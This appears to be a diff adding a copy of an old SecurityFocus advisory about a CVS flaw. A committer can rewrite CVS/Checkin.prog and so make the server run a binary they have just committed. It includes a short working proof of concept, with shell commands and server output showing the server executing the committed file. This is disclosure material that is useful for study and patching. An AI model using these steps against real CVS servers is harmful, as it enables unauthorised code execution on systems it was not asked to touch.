@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/1524/info
+
+A CVS committer can execute arbitrary binaries by using Checkin.prog. Usually CVS/Checkin.prog in a working directory is copied from CVSROOT/modules when the directory is "checkout"ed and it is sent back to the server and executed with committing. Note that when it is executed, committed files exist in the current directory.
+
+Since a working directory can be modified by a committer, Checkin.prog may be modified or even newly created. If a malicious committer does this, cvs server executes the modified Checkin.prog. Also note that the committer can create an arbitrary binary file by `cvs add -kb' and `cvs commit'. The malicious committer can execute the recently committed binary file via Checkin.prog triggered by the `cvs commit'.
+
+% cvs -d :pserver:test@localhost:/tmp/cvs -f co somemodule
+cvs server: Updating somemodule
+% cd somemodule
+% cp /bin/ls binary
+% cvs add -kb binary
+cvs server: scheduling file `binary' for addition
+cvs server: use 'cvs commit' to add this file permanently
+% echo ./binary > CVS/Checkin.prog
+% cvs commit -m 'test'
+cvs commit: Examining .
+RCS file: /tmp/cvs/somemodule/binary,v
+done
+Checking in binary;
+/tmp/cvs/somemodule/binary,v <-- binary
+initial revision: 1.1
+done
+cvs server: Executing ''./binary' '/tmp/cvs/somemodule''
+#cvs.lock
+#cvs.wfl.serein.m17n.org.14330
+binary,v 
